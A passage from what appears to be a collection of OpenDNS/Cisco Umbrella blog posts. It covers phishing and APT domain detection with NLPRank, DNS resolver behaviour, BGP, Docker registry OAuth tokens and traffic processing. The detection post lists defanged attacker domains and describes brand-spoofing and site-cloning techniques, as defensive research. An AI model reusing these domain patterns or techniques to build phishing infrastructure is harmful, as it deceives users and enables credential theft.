laterally across systems and gain access to administrative accounts, which were used to conduct fraudulent money transfers and control ATMs. As reported by Fox-IT and Kaspersky, these attacks were conducted by an advanced persistent threat (APT) group. OpenDNS Security Labs builds predictive models to track these types of adversarial groups and block domains related to their activities, in order to keep our customers safe. To create these models, we mine our large DNS data infrastructure for data about attacks and then uncover the patterns within. Looking at the data related to these attacks, we found that the domains in this particular Carbanak data set exhibited similar patterns to domains associated with DarkHotel and other APT data sets. Additionally, we were able to collaborate with Michael Sandee from Fox IT security to gain access to data from the Anunak attacks, which had overlap with the Kasperksy report. Let’s take a look at some of the features we were able to extract from the data sets. When comparing these domains to the DarkHotel data set and other APT domains, we observed that they were constructed in a similar lexical fashion. One of the spoofing techniques often leveraged is the impersonation of a legitimate software or tech company in an email claiming a required software update. Some examples from the different sets were as follows: DarkHotel: adobeupdates[.]com adobeplugs[.]net adoberegister[.]flashserv[.]net microsoft-xpupdate[.]com Carbanak: update-java[.]net adobe-update[.]net Examples of APT Domains: gmailboxes[.]com microsoft-update-info[.]com firefoxupdata[.]com Essentially we are defining a “malicious language” within the lexical nature of DNS traffic, and applying sentiment analysis on FQDNs. In an attempt to construct this language, we have created a corpus of domains that elicit a common pattern where adversaries merge together certain dictionary words and tech company strings. Here are some examples from our corpus: facebooklogin-facebook[.]com security-paypal-center[.]com securitycheck-paypal[.]com billingupdate-paypal[.]com We also observed patterns in WHOIS information from some of the Anunak/Carbanak domains many of which are registered with Bizcn.com, Inc. For example: Details for update-java[.]net When conducting our investigations with OpenDNS Investigate, we found that there were multiple examples of suspicious looking domains advertising “java updates”. Additionally they all exist on the same infrastructure, are lexically similar, and exhibit similar interesting patterns: OpenDNS Security Labs specializes in developing new threat detection models to identify different types of attacks. One of the newest additions to our arsenal is NLPRank. Utilizing natural language processing (NLP), the predictive model identifies potentially malicious typo-squatting/targeted phishing domains. APT groups often use spear-phishing techniques and legitimate domain spoofing as an obfuscation technique to carry out their criminal campaigns. NLPRank is designed to detect these fraudulent branded domains that often serve as C2 domains for targeted attacks. Our system utilizes heuristics such as NLP, ASN mappings and weightings, WHOIS data patterns, and HTML tag analysis to classify these type of attack domains. NLPRank uses a minimum edit-distance on substrings to check for the word distance between legitimate and typo-squatting domains (ex. malware.com vs. rnalware.com , linkedin.com vs. 1inkedin.net ). Let’s step back and discuss high-level how the edit-distance algorithm works. Minimum edit-distance is a shortest-path, dynamic-programming algorithm  that checks for similarity between 2 strings. The minimum edit-distance between 2 strings is defined as the minimum number of edits it takes (ex. insertion, deletion, substitution) to turn string A into string B. Basically anytime you have to make an edit you incur a penalty. We are searching for the least path (sequence of edits), from our initial string to our goal string. Initial state: string we’re transforming Operations: insert, delete, substitution Goal state: final string Path cost: minimized # of edits Word Example: Initial String: i n c e _ p t i o n Goal String: _ e x e c u t i o n For this example, there are 5 edits, 3 substitutions, 1 deletion, 1 insertion, making the penalty 5. Domain example: Initial Domain: g00gle.com Goal Domain: google.com For this example, there are 2 edits, 2 substitutions, making the penalty 2. Some real-world applications of the edit-distance algorithm are seen in spell-checking, information retrieval, machine translation, speech recognition, computational biology to align nucleotide sequences, and now information security. The intuition behind using this algorithm is that essentially we’re trying to define a language used by malicious domains vs. a language of benign domains in DNS traffic. Another way NLPRank detects fraudulent domain behavior is observing domains hosted on ASNs that are unassociated with the company they’re spoofing. We leveraged OpenDNS SecurityGraph’s vast amount of ASN data to investigate different types of attacks in our user’s DNS data. We used this to build up an ASN map of all legitimate domains mapping to their appropriate ASNs. For example, you would expect an Adobe domain advertising an update to be associated with an ASN associated with Adobe (ex. 14365, 44786, etc.), or a Java update to be associated with an Oracle ASN (ex. 41900, 1215, etc.). Both of the Carbanak domains mentioned above using those company names as substrings came from: ASN 44050, PIN-AS Petersberg Internet Network LLC in Russia. NLPRank, which also detected some of these Anunak/Carbanak domains, was recently used to identify a cluster of advanced Paypal Phishing Attacks that we detailed on this blog. It was also able to identify many similar types of phishing attacks spoofing major companies including: Google/Gmail, WellsFargo, Facebook, Dropbox, Apple/iTunes, and many more from Paypal. We also found that attackers use kits and tools such as HTTrack to copy legitimate sites. Here is a snippet of code we found in the HTML of one of these Phishing sites outlining tool used to copy the site: One of the interesting things we found was that certain tags were directly copied from the legitimate site. For example some the links found for jobs on spoofed Paypal pages, would be directly linked to the jobs page on the legitimate Paypal site. Here is just a few of the screenshots of NLPRank’s findings: Google/Gmail Phishing Site Facebook phishing site WellsFargo Phishing Multiple Company Typo-squatting on “google” Adobe spoofing using Dropbox Webpage A bunch of Paypal Phishing sites Here is another Paypal which was a redirect from the domain email-paypal[.]info One can see from the above examples that NLPRank is succeeding in identifying domain spoofing/targeted phishing attacks, and is a robust method for defending against APT attacks such as Anunak/Carbanak. Our labs team will continue to develop NLPRank threat model to discover more of these type of targeted attacks domains and keep our customers safe.", "date": "2015-03-05"},
{"website": "Cisco-Umbrella", "title": "New to Content Filtering: URL Shorteners", "author": ["Vinny LaRiza"], "link": "https://umbrella.cisco.com/blog/new-content-filtering-url-shortener", "abstract": "Most of us are probably familiar with URL shorteners at this point. They’re those online applications that take a long URL string and convert it to something shorter. The shortener doesn’t replace the URL, but rather creates a redirect that’s a little easier on the eyes. Nowadays, you see them a lot on Twitter, due to the 140-character limit for tweets. There have been many reported instances of attackers utilizing URL shorteners to mask a phish or malware domain to which they intend to redirect you. There are services that allow you to “unwrap” a shortened URL and reveal its actual destination; that, however, requires questioning a short URL’s legitimacy, which you may not think twice about doing if the short URL is crafted well enough. We’re pleased to announce that we will be introducing the URL Shortener category to our Domain Tagging system to allow the optional filtering of this category on your OpenDNS network! It’s not necessarily a security risk to allow these domains, but if you wanted to cut the URL middleman out of the picture altogether, we now make that option easy for you. Do you have some URL Shorteners that you’d like to add to the URL Shortener repository? Let us know about it!", "date": "2016-06-08"},
{"website": "Cisco-Umbrella", "title": "Dual Stack + DNS Search Domains = Host Roulette", "author": ["Lucas Siba"], "link": "https://umbrella.cisco.com/blog/dual-stack-search-domains-host-roulette", "abstract": "If you’re using a dual-stacked machine and have multiple search domains in your resolv.conf, you can potentially end up resolving multiple addresses which correspond to completely different hosts. At OpenDNS we care a lot about DNS and issues related to DNS resolution, so when we came across some odd behaviors in resolving hosts on dual-stacked machines (meaning they have both IPv4 and IPv6 addresses), we wanted the world to know. Hopefully the following can help prepare users for some of the gotchas and maybe even inspire certain operating-system maintainers to release a few patches. Our test environment was fairly straight forward, we set up an authoritative nameserver with 3 different sub-domains defined. We gave the first sub-domain an IPv4 address only, the second an IPv6 address only, and the third was given both IPv4 and IPv6 addresses. # Domain  TTL  Type  Address\ngw. network1 .opendns.com  30  a     1.1.1.1\ngw. network2 .opendns.com  30  aaaa  2001:470:b:1fc::1\ngw. network3 .opendns.com  30  a     2.2.2.2\ngw. network3 .opendns.com  30  aaaa  2001:470:b:1fc::2 We then went onto four different machines with four different operating system, configured them to be dual-stacked, and configured their resolv.conf to have network{1,2,3}.opendns.com in their search domains: # configuration syntax varies across OS’s\nnameserver 67.215.93.85\nsearch network1 .opendns.com network2 .opendns.com network3 .opendns.com We then ran tcpdump to watch the outbound DNS requests and used a simple wrapper program around getaddrinfo() to perform the lookups. What should happen when we try to resolve the hostname “ gw ”? We would expect, if an OS is following the “prefer IPv6” standard that we should get “2001:470:b:1fc::1” (the IPv6 address of gw.network2.opendns.com ). We expect this because according to the specified search domains, the OS should go through the search domains in the order network1, network2, network3, but also because the OS should be preferring IPv6. For OS’s that follow the Happy-Eyeballs RFC / style we would expect to get “1.1.1.1” as this would be the first thing that would be found as defined by the search domains order. So let’s have a look at what the OS’s actually did… OSX – 10.9.3 # sudo tcpdump -n -s 1500 -i en0 udp port 53 10.10.10.165.63835 > 67.215.93.85.53: 4769+ A? gw. network1 .opendns.com. (41)\n10.10.10.165.55987 > 67.215.93.85.53: 4925+ AAAA? gw. network1 .opendns.com. (41)\n67.215.93.85.53 > 10.10.10.165.63835: 4769 1/0/0 A 1.1.1.1 (57)\n67.215.93.85.53 > 10.10.10.165.55987: 4925 0/0/0 (41)\n10.10.10.165.62135 > 67.215.93.85.53: 3489+ AAAA? gw. network2 .opendns.com. (41)\n67.215.93.85.53 > 10.10.10.165.62135: 3489 1/0/0 AAAA 2001:470:b:1fc::1 (69) From the tcpdump output we can see that OSX has decided to send out A (IPv4) and AAAA (IPv6) requests to the first search domain (network1.opendns.com) simultaneously. When the A request gets a valid response, but the AAAA response receives a NODATA response, the OS continues down the search domains list to try and resolve a AAAA answer. The OS then requests a AAAA from network2.opendns, which responds with a valid AAAA answer. Lets now look at what was actually returned by the getaddrinfo call: # ./getaddrinfo gw AF_INET6 (IPv6) - SOCK_STREAM - IPPROTO_TCP - 2001:470:b:1fc::1\nAF_INET  (IPv4) - SOCK_STREAM - IPPROTO_TCP - 1.1.1.1 This where things get odd, the OS’s underlying resolving library has returned us two answers to our request for the domain “gw”, but the actual corresponding host behind each IP are completely different . The IPv4 “1.1.1.1” is for gw.network1.opendns.com and the IPv6 “2001:470:b:1fc::1” answer is for “gw.network2.opendns.com”. At this point, it would be up to the calling application to choose which answer or protocol it prefers, but there is no indication that these correspond to completely different hosts… That’s bad… Linux – Ubuntu 12.04 67.215.92.110.14766 > 67.215.93.85.53: 1096+ AAAA? gw. network1 .opendns.com. (41)\n67.215.93.85.53 > 67.215.92.110.14766: 1096 0/0/0 (41)\n67.215.92.110.21993 > 67.215.93.85.53: 51327+ AAAA? gw. network2 .opendns.com. (41)\n67.215.93.85.53 > 67.215.92.110.21993: 51327 1/0/0 AAAA 2001:470:b:1fc::1 (69)\n67.215.92.110.32972 > 67.215.93.85.53: 50275+ A? gw. network1 .opendns.com. (41)\n67.215.93.85.53 > 67.215.92.110.32972: 50275 1/0/0 A 1.1.1.1 (57) AF_INET6 (IPv6) - SOCK_STREAM - IPPROTO_TCP - 2001:470:b:1fc::1\nAF_INET (IPv4)  - SOCK_STREAM - IPPROTO_TCP - 1.1.1.1 Linux doesn’t fair much better. Although it does start resolving for an IPv6 host first, once it’s found one, it continues to resolve an IPv4 address as well. Also, just like OSX, Linux’s getaddrinfo() returns addresses for both gw.network1.opendns.com and gw.network2.opendns.com. FreeBSD 10.* 10.11.13.129.34506 > 67.215.93.85.53: 44935+ A? gw. network1 .opendns.com. (41)\n67.215.93.85.53 > 10.11.13.129.34506: 44935 1/0/0 A 1.1.1.1 (57)\n10.11.13.129.55819 > 67.215.93.85.53: 44936+ AAAA? gw. network1 .opendns.com. (41)\n67.215.93.85.53 > 10.11.13.129.55819: 44936 0/0/0 (41) AF_INET (IPv4)  - SOCK_STREAM - IPPROTO_TCP - 1.1.1.1 FreeBSD restores our faith in resolving principals. From the tcpdump we can see that it has tried to resolve both an A and AAAA record for the first domain in the resolve search list, and because it found a match (on the A record) it stops there. The getaddrinfo() has returned only the matching IPv4 address. If we repeat this test but move the search domain of “network2” ahead of “network1”, we can see that now (correctly) only the IPv6 address is returned. 10.11.13.129.34506 > 67.215.93.85.53: 44935+ A? gw. network2 .opendns.com. (41)\n67.215.93.85.53 > 10.11.13.129.34506: 44935 NXDomain 0/1/0 (116)\n10.11.13.129.55819 > 67.215.93.85.53: 44936+ AAAA? gw. network2 .opendns.com. (41)\n67.215.93.85.53 > 10.11.13.129.55819: 44936 1/0/0 AAAA[|domain] AF_INET6 (IPv6) - SOCK_STREAM - IPPROTO_TCP - 2001:470:b:1fc::1 If the test is then repeated with “network3” as the first search domain, we (correctly) get both the IPv4 and IPv6 addresses of gw.network3.opendns.com AF_INET6 (IPv6) - SOCK_STREAM - IPPROTO_TCP - 2001:470:b:1fc::2\nAF_INET  (IPv4) - SOCK_STREAM - IPPROTO_TCP - 2.2.2.2 Windows 8.1 Microsoft’s current offering also gets a passing grade for dual-stacked search domain use. Windows 8.1 performed exactly the same as FreeBSD in all tests scenarios, giving all the expected answers. This shouldn’t come as a big surprise as most of the Windows network stack is derived from BSD source , and we’d be surprised if the resolving libraries weren’t used as well. As we can see from the above results, resolving domains on a dual-stacked machine that uses search domains can lead to some confusing results. The recent OS offerings from OSX and Ubuntu leaves the onus on the calling application to decide how to deal with the coming dual stacked world. Fortunately though, the offerings from FreeBSD and Windows do show that some implementations foresaw this issue and implemented the expected functionality.", "date": "2014-06-04"},
{"website": "Cisco-Umbrella", "title": "BGP and the System of Trust that Runs the Internet Pt. 1", "author": ["Owen Lystrup"], "link": "https://umbrella.cisco.com/blog/bgp-and-the-system-of-trust-that-runs-the-internet-pt-1", "abstract": "Editor’s note: This is part one of a two-part series on BGP. The number of smart devices connecting to the Internet are reaching an unprecedented level. Estimates are predicting as many as 75 billion devices will come online by 2020, which means Internet traffic routing is going to get a lot more complex. What most Internet users don’t know, but many are beginning to discover , is the entire framework that holds the Internet together can be quite fragile. In fact the system in charge of correctly routing Internet traffic is largely built on a collective trust, or as The Washington Post recently described it, an ‘ honor code ’ of the Internet. The fact is we all rely on core protocols of the Internet like BGP (border gateway protocol) and DNS (domain name services) every day. They are a foundation of the Internet. Even companies that provide content on the Internet but don’t need BGP services directly, still rely on the service to get that content to their customers. This two-part series will cover BGP, what it is, how it works, and what global moving parts are involved. Part two of this series, publishing next week, will cover the technical and security issues surrounding BGP, and why they often have a drastic effect on a global scale. The Buried Superhighway There is good reason behind portraying the Internet as a superhighway. Internet requests have a starting point (usually a device or computer) and a destination (like a website or app service). But the superhighway analogy is also apt because the Internet–despite its illusionary feeling of magic behind a box –is largely a physical thing, consisting of cables that run for hundreds of thousands of miles, many of them underground. An interactive map of the submarine cable routes, from submarinecablemap.com Pictured is a map of the submarine routes Internet cables take around the globe. They are literally physical cables that surface out of the ocean to connect all the countries of the world to one another. The other half of what makes the magic of the Internet work, are the various standards and protocols involved– the documented , collective agreement on how the Internet and its protocols should function, and the provider companies who pledge to make them work the way they should. The resulting covenants between Internet providers, are what keep the entire wheel of the Internet churning. And BGP plays a major role. A common description of DNS (domain name services) is “the address book” of the internet. DNS looks up and resolves domains, like google.com, to their correct IP addresses, which are the real destination. If DNS is the address book that finds the destination, BGP is the system of freeway signs that show which routes can get there. Just like roads and freeways, some routes are quick and direct, and some routes send traffic on misdirected tangents. BGP is the complex, interweaving system that gets Internet traffic where it needs to go, hopefully as efficiently as possible. Peering: Good Neighbors Make Faster Internet Andree Toonk, founder of BGPMon and manager of network engineering at OpenDNS, explained in an interview that the problems and outages the world has seen recently that involved BGP start with how the networking relationships between providers and businesses work. The Internet as it is today consists largely of two types of relationships between businesses and ISPs, Toonk said. The first and more straightforward type of relationship is between providers and customers. In this scenario, customers–smaller regional ISPs and businesses like DropBox and OpenDNS–pay large providers–like AT&T and Level 3–to provide connectivity service for their users and customers. This type of relationship is formal, and can be costly depending on the providers and the details involved. Peering is the second type of relationship, Toonk says, and it brings a few unique benefits. If a small local ISP wants to connect its customers to Facebook, for example, and doesn’t want to pay the large ISP acting as the middleman, the smaller ISP can connect using a peering relationship. Getting to Facebook is much easier done when there is a direct connection, and it will usually have less latency. And, Toonk says, one of the great benefits in a peering relationship is they are usually much more cost effective. A map of Internet exchange locations from datacentermap.com These peering relationships are typically established at an Internet exchange (IX). They are pretty much exactly what they sound like, a central location where a large number of ISPs, businesses, and content providers connect to one another physically. Exchanges exist all over the globe, and they allow a more direct way of connecting end users to the Internet and its bounty of sites and services. These relationships are at the core of how companies and Internet providers connect to one another globally. But, as Toonk explained, they can also be the source for huge routing and security issues. That is because the relationships keeping the Internet functioning, especially peering relationships, are where the “honor code” mentioned earlier comes into play. Stay tuned for part two, which will explain how the honor code works, how BGP is becoming a new target for hackers, its involvement in some of the largest Internet outages ever seen, and the steps the industry is taking to correct the issues.", "date": "2015-06-18"},
{"website": "Cisco-Umbrella", "title": "Implementing OAuth for Registry V2", "author": ["Jack Zheng"], "link": "https://umbrella.cisco.com/blog/implementing-oauth-for-registry-v2", "abstract": "As the end of life for Docker registry V1 quickly approaching, the Quadra team has been working hard on the migration to Docker registry v2. We also saw this as a good opportunity to make some improvements to our current authentication setup for the registry, which uses Basic Authentication over HTTPS. After some experimentations, we’ve decided to try out the token based OAuth system, which will not only provide a much more sophisticated access control for our user images, but also allow us to use the same authentication across multiple registries. In this blog post, I will give an overview of OAuth workflow for Docker registries, and explain some of the implementation details which we’ve found to be poorly documented at the moment. Hopefully by the end of this, you will be able to roll out your own OAuth Server with Docker registry! Just Show Me The Code A sample implementation of our OAuth server can be found here . It’s a simple Flask app that understands the OAuth workflow and responds with a token that the v2 registry can understand. Instructions on how the setup the project can be found here, along with some explanations on its configurations. OAuth Workflow The OAuth authentication workflow for Docker registry can be described with the following steps: Client begins with a connection to the image registry If the image registry is properly setup with OAuth enabled, it will return a 401 error, and its response will contain information on how to authenticate The client then contacts the authorization server as instructed with the previous response from the registry The authorization server then returns a token representing the client’s access The client makes another request to the image registry, this time with the token embedded in its header The image registry tries to validate the token, and if successful, returns the resources requested by the client. Let’s walk through a concrete example. First, start the demo project in our repo. Then let’s make a request to our local registry: curl https://192.168.99.100:5000/v2/_catalog\n*   Trying 192.168.99.100...\n* Connected to 192.168.99.100 (192.168.99.100) port 5000 (#0)\n* TLS 1.2 connection using TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA\n* Server certificate: localhost\n> GET /v2/_catalog HTTP/1.1\n> Host: 192.168.99.100:5000\n> User-Agent: curl/7.43.0\n> Accept: */*\n>\n< HTTP/1.1 401 Unauthorized\n< Content-Type: application/json; charset=utf-8\n< Docker-Distribution-Api-Version: registry/2.0\n< Www-Authenticate: Bearer realm=\"http://192.168.99.100:8080/tokens\",service=\"demo_registry\",scope=\"registry:catalog:*\"\n< X-Content-Type-Options: nosniff\n< Date: Sun, 31 Jan 2016 22:29:49 GMT\n< Content-Length: 134\n<\n{\"errors\":[{\"code\":\"UNAUTHORIZED\",\"message\":\"authentication required\",\"detail\":[{\"Type\":\"registry\",\"Name\":\"catalog\",\"Action\":\"*\"}]}]} As expected, the registry responded with a 401 error. More importantly however, the Www-Authenticate header in the response specifies how the client should authenticate. Let’s break it down: Realm: realm tells the client where the OAuth server is located. In our case it points to http://192.168.99.100:8080/tokens Service: service tells the OAuth server where the resources are hosted. In our case it’s our demo_registry Scope: scope tells the OAuth server what kind of permissions are needed. In our case we are asking for admin access on the catalog endpoint. Now we should have all the information we need to contact our OAuth server. To be consistent with the way the docker client authenticates, let’s also pass our user credentials in the header in the HTTP Basic Auth format. First, base64 encode our credentials: $ echo -n username:password | base64\ndXNlcm5hbWU6cGFzc3dvcmQ= Then we can embed the result in our headers as follows: curl -H \"Authorization: Basic dXNlcm5hbWU6cGFzc3dvcmQ=\" http://192.168.99.100:8080/tokens?service=demo_registry&scope=registry:catalog:*\n\n*   Trying 192.168.99.100...\n* Connected to 192.168.99.100 (192.168.99.100) port 8080 (#0)\n> GET /tokens?service=demo_registry&scope=registry:catalog:* HTTP/1.1\n> Host: 192.168.99.100:8080\n> User-Agent: curl/7.43.0\n> Accept: */*\n> Authorization: Basic dXNlcm5hbWU6cGFzc3dvcmQ=\n>\n< HTTP/1.1 200 OK\n< Server: gunicorn/19.4.5\n< Date: Sun, 31 Jan 2016 22:58:54 GMT\n< Connection: close\n< Content-Type: application/json\n< Content-Length: 719\n<\n{\n \"token\": \"eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6IllJMkI6N01JUTpIT0I0OjdXN0I6Uk5NTDpaRUZVOkdLMkc6VkM3RTo3UUhHOkdVR1Y6T1FYVTozN0lUIn0.eyJzdWIiOiIiLCJpc3MiOiJkZW1vX29hdXRoX3NlcnZlciIsImFjY2VzcyI6W3sidHlwZSI6InJlZ2lzdHJ5IiwibmFtZSI6ImNhdGFsb2ciLCJhY3Rpb25zIjpbIioiXX1dLCJleHAiOjE0NTQyODQ3MzQsImlhdCI6MTQ1NDI4MTEzNCwibmJmIjoxNDU0MjgxMTM0LCJhdWQiOiJkZW1vX3JlZ2lzdHJ5In0.QYGsEkuFv5Mpg2_2oov3KylQcYZEhXJXGKB_ahDCmya4MUnyprRISFfk3Eovvc5OgGWUQx5-Gl7eSBidVI0z7K29wUV7ITL5prnbwg5pIjxJAYLkzBCmouiAyE24Uxy2vkVtDTicWsWT7H54Ou_v2umv7bQe6JB3t6vYsmb3taiDUI_RTWxfSOp7OK1n6UVFEEUHiV57wP3aWZ60A379a9ZP6sEHKhEi306OvXPyaz804KFH7sTqbSMYf9DP_Gy8Jh04Tw9zKmClk-byct8Hspelw1JytbsQonlKwV9OH30DTCjgaWyNiavTTdfpRmiDRRMRsROjw2JLL8ZMMTZEhQ\"\n} As expected, the oauth server responded with our token. With this token, now we can make another request to the registry: curl -H \"Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6IllJMkI6N01JUTpIT0I0OjdXN0I6Uk5NTDpaRUZVOkdLMkc6VkM3RTo3UUhHOkdVR1Y6T1FYVTozN0lUIn0.eyJzdWIiOiIiLCJpc3MiOiJkZW1vX29hdXRoX3NlcnZlciIsImFjY2VzcyI6W3sidHlwZSI6InJlZ2lzdHJ5IiwibmFtZSI6ImNhdGFsb2ciLCJhY3Rpb25zIjpbIioiXX1dLCJleHAiOjE0NTQyODQ3MzQsImlhdCI6MTQ1NDI4MTEzNCwibmJmIjoxNDU0MjgxMTM0LCJhdWQiOiJkZW1vX3JlZ2lzdHJ5In0.QYGsEkuFv5Mpg2_2oov3KylQcYZEhXJXGKB_ahDCmya4MUnyprRISFfk3Eovvc5OgGWUQx5-Gl7eSBidVI0z7K29wUV7ITL5prnbwg5pIjxJAYLkzBCmouiAyE24Uxy2vkVtDTicWsWT7H54Ou_v2umv7bQe6JB3t6vYsmb3taiDUI_RTWxfSOp7OK1n6UVFEEUHiV57wP3aWZ60A379a9ZP6sEHKhEi306OvXPyaz804KFH7sTqbSMYf9DP_Gy8Jh04Tw9zKmClk-byct8Hspelw1JytbsQonlKwV9OH30DTCjgaWyNiavTTdfpRmiDRRMRsROjw2JLL8ZMMTZEhQ\" https://192.168.99.100:5000/v2/_catalog\n\n*   Trying 192.168.99.100...\n* Connected to 192.168.99.100 (192.168.99.100) port 5000 (#0)\n* TLS 1.2 connection using TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA\n* Server certificate: localhost\n> GET /v2/_catalog HTTP/1.1\n> Host: 192.168.99.100:5000\n> User-Agent: curl/7.43.0\n> Accept: */*\n> Authorization: Bearer\neyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6IllJMkI6N01JUTpIT0I0OjdXN0I6Uk5NTDpaRUZVOkdLMkc6VkM3RTo3UUhHOkdVR1Y6T1FYVTozN0lUIn0.eyJzdWIiOiIiLCJpc3MiOiJkZW1vX29hdXRoX3NlcnZlciIsImFjY2VzcyI6W3sidHlwZSI6InJlZ2lzdHJ5IiwibmFtZSI6ImNhdGFsb2ciLCJhY3Rpb25zIjpbIioiXX1dLCJleHAiOjE0NTQyODQ3MzQsImlhdCI6MTQ1NDI4MTEzNCwibmJmIjoxNDU0MjgxMTM0LCJhdWQiOiJkZW1vX3JlZ2lzdHJ5In0.QYGsEkuFv5Mpg2_2oov3KylQcYZEhXJXGKB_ahDCmya4MUnyprRISFfk3Eovvc5OgGWUQx5-Gl7eSBidVI0z7K29wUV7ITL5prnbwg5pIjxJAYLkzBCmouiAyE24Uxy2vkVtDTicWsWT7H54Ou_v2umv7bQe6JB3t6vYsmb3taiDUI_RTWxfSOp7OK1n6UVFEEUHiV57wP3aWZ60A379a9ZP6sEHKhEi306OvXPyaz804KFH7sTqbSMYf9DP_Gy8Jh04Tw9zKmClk-byct8Hspelw1JytbsQonlKwV9OH30DTCjgaWyNiavTTdfpRmiDRRMRsROjw2JLL8ZMMTZEhQ\n>\n< HTTP/1.1 200 OK\n< Content-Type: application/json; charset=utf-8\n< Docker-Distribution-Api-Version: registry/2.0\n< X-Content-Type-Options: nosniff\n< Date: Sun, 31 Jan 2016 23:58:06 GMT\n< Content-Length: 20\n<\n{\"repositories\":[]} Finally, the registry returns our desired response after it validated our token. The OAuth Token Now that we are familiar with the OAuth workflow, we should also learn about the OAuth Token and how the OAuth server should generate them. The Docker Registry accepts a well-known token format called JSON Web Token or JWT as its authentication token. The JWT token consists of three parts separated by periods (.): Header, Claim, and Signature. A typical JWT token will look like this: eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6IllJMkI6N01JUTpIT0I0OjdXN0I6Uk5NTDpaRUZVOkdLMkc6VkM3RTo3UUhHOkdVR1Y6T1FYVTozN0lUIn0.eyJzdWIiOiIiLCJpc3MiOiJkZW1vX29hdXRoX3NlcnZlciIsImFjY2VzcyI6W3sidHlwZSI6InJlZ2lzdHJ5IiwibmFtZSI6ImNhdGFsb2ciLCJhY3Rpb25zIjpbIioiXX1dLCJleHAiOjE0NTQyODQ3MzQsImlhdCI6MTQ1NDI4MTEzNCwibmJmIjoxNDU0MjgxMTM0LCJhdWQiOiJkZW1vX3JlZ2lzdHJ5In0.QYGsEkuFv5Mpg2_2oov3KylQcYZEhXJXGKB_ahDCmya4MUnyprRISFfk3Eovvc5OgGWUQx5-Gl7eSBidVI0z7K29wUV7ITL5prnbwg5pIjxJAYLkzBCmouiAyE24Uxy2vkVtDTicWsWT7H54Ou_v2umv7bQe6JB3t6vYsmb3taiDUI_RTWxfSOp7OK1n6UVFEEUHiV57wP3aWZ60A379a9ZP6sEHKhEi306OvXPyaz804KFH7sTqbSMYf9DP_Gy8Jh04Tw9zKmClk-byct8Hspelw1JytbsQonlKwV9OH30DTCjgaWyNiavTTdfpRmiDRRMRsROjw2JLL8ZMMTZEhQ Let’s find out how each part of the JWT token is generated. Header A JWT Header typically look like this before encoding (formatted with white space for readability): {\n            \"typ\": \"JWT\",\n            \"alg\": \"RS256\",\n            \"kid\": \"ABCD:EFGH:IJKL:MNOP:QRST:UVWX:YZ23:4567:ABCD:EFGH:IJKL:MNOP\"\n } The “typ” field specifies the type of the token, and is usually set to “JWT.” The “alg” field specifies the algorithm used to generate the signature part of the token. For simplicity, our OAuth server only supports the RS256 Algorithm. A list of commonly used values for this field is listed below: Last but not the least, the “kid” field is an unique ID generated from the public part of the signing key. It was the source of a fair bit of frustration for us because there are no documentations on how this field should be generated! It wasn’t until we dug through the Github repository for Docker registry source code that we finally solved it. So, long story short, for Docker registry, the “kid” field should be implemented as follows: Take the SHA256 hash of the DER encoded public key, and truncate it to 240 bits. The result of that is then encoded into 12 base32 groups. The final result look like this: ABCD:EFGH:IJKL:MNOP:QRST:UVWX:YZ23:4567:ABCD:EFGH:IJKL:MNOP You can find our implementation of the algorithm here . Now that we have all the fields we need, we can create the actual header: strip all white spaces from the header, the result of which is base64 urlsafe encoded to form the first part of the token. Claim Also known as the JWT payload, the claim set for the JWT token typically look like this: {\n \"sub\": \"\",\n \"iss\": \"demo_oauth_server\",\n \"access\": [\n   {\n     \"type\": \"registry\",\n     \"name\": \"catalog\",\n     \"actions\": [\n       \"*\"\n     ]\n   }\n ],\n \"exp\": 1454284734,\n \"iat\": 1454281134,\n \"nbf\": 1454281134,\n \"aud\": \"demo_registry\"\n} The “iss” field specifies where the token is issued from, usually the FQDN of the OAuth Server is used. The “aud” field specifies the intended audience of the token, usually this is set to the FQDN of the docker registry. The ‘exp’ field specifies the expiration time of the token in unix time. The ‘nbf’ (not before) field specifies the earliest time when the token is valid. The “iat” field specifies when the token is issued. The “access” field specifies what kind of permission this token has. In our example, the token granted us “push and pull” permissions on the repository named samalba/my-app. The Oauth server should generate this field based on the access request generated during the first connection to docker registry. Again, white spaces are stripped from the claim and the result is then base64 urlsafe encoded to form the second part of the token. Signature The signature is generated by taking the base64 urlsafe encoded header concatenated with the base64 urlsafe encoded claim using a period and signing it with the key and algorithm specified in the header. Using the header and claim given above, the pseudo code to generate the signature would be the following: RS256(base64_urlsafe_encode(header) + “.” + \nbase64_urlsafe_encode(claim),  key) The result is then concatenated to the token as the final part. A live debugger can be found at https://jwt.io/ , and it can be a very useful way to make sure your tokens are valid. Conclusion Rolling out our own OAuth server wasn’t easy, and we hope that this blog has provided you with a good starting point so you don’t have to repeat some of the problems we faced. Feel free to play around with the OAuth server app and submit changes or improvements!", "date": "2016-02-23"},
{"website": "Cisco-Umbrella", "title": "The Avalanche Project: When High Frequency Trading Meets Traffic Classification", "author": ["Thibault Reuille"], "link": "https://umbrella.cisco.com/blog/the-avalanche-project-when-high-frequency-trading-meets-traffic-classification", "abstract": "One of the key challenges for OpenDNS (now part of Cisco) is handling a massive amount of DNS queries and simultaneously running classification models on them as fast as possible. Today, we’re going to talk about Avalanche , a real-time data processing framework currently used in our research cluster. First, we have to run some numbers to evaluate the amplitude of our requirements and make smart architecture design decisions. Second, we will assess some similarities with other technical fields (such as quantitative trading in finance) that share very similar problematics, and see if we can find a common ground. Finally, we will expose some details and key elements of the Avalanche project. Evaluating the traffic Before jumping into any design or implementation, we need to take a look at the amount of traffic that OpenDNS sees during slow and peak hours every day. I decided to take a look at the log collection from one of our resolvers located in Amsterdam. This resolver is comprised of several machines that handle  DNS queries, of which we’re going to consider only one ( m1 ). It also sees various types of traffic, but here we will only focus on authoritative traffic ( Authlogs ) and recursive traffic ( Querylogs ). It is important to mention that the Amsterdam resolver, despite its significant amount of traffic, is not the biggest nor the smallest of our resolvers. Let’s take a look : Amsterdam being at GMT + 1 hour, noon is the peak moment of the day. Whereas the traffic around midnight is typically very slow. The upper part of the table shows the amount of data contained in each log chunk. Important to note here: each resolver produces one chunk every 10 minutes. The lower part of the table exposes the same information converted to queries per second. For Authlogs, we observe a variation of 686.75 to 941.25 queries per second. For Querylogs, we observe a variation of 5525.26 to 10246.66 queries per second. Put differently, authlogs peak at one message every 1.062 milliseconds, where querylogs peak at one message every 97 microseconds. These figures give a better understanding of the traffic volume and 